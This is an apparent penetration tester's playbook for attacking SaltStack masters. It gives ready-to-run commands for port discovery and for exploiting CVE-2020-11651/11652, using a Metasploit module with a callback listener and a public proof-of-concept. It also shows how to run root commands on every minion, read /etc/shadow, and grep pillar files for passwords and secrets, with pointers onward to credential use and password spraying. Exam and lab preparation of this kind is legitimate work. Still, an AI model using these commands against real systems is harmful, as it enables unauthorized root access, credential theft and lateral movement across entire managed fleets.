# SaltStack

## Before I start
- [ ] 4505 and 4506 both open: a Salt master
nmap -p 4505,4506 --open <TargetIP>

## CVE-2020-11651 and CVE-2020-11652
- [ ] OSCP one-target limit: this Metasploit exploit spends my one target, even if it fails
- [ ] Before 3000.2, and 2019.2.x before 2019.2.4: commands on the master with no login, as root
searchsploit saltstack
msfconsole -q -x 'use exploit/linux/misc/saltstack_salt_unauth_rce; set RHOSTS <TargetIP>; set LHOST <LHOST>; run'
By hand, jasperla's exploit.py, from https://github.com/jasperla/CVE-2020-11651-poc, which needs the salt Python package:
git clone https://github.com/jasperla/CVE-2020-11651-poc
python3 CVE-2020-11651-poc/exploit.py --master <TargetIP> --exec 'id'
- [ ] --exec runs on the master, --exec-all on every minion, and -r reads a file such as /etc/shadow

## The master is every minion
On the master, as root:
salt '*' cmd.run 'id'
salt '*' file.read /etc/shadow
- [ ] Every minion runs what the master sends, as root

## What the master holds
cat /etc/salt/master
ls /etc/salt/pki/master/
grep -rniE 'password|secret|key' /srv/salt /srv/pillar 2>/dev/null
- [ ] Pillar data is production secrets, in plain YAML
- [ ] The same control-node model as Ansible: :Pb ansible

## If it fails
- [ ] Patched, as anything since April 2020 should be: the ports still say it is a master, so its pillar credentials by another way in
- [ ] Only 4505 open: perhaps only a minion, and less interesting

## Next
- [ ] Root: :Pb linux-creds
- [ ] Pillar secrets tried everywhere: :Pb spraying
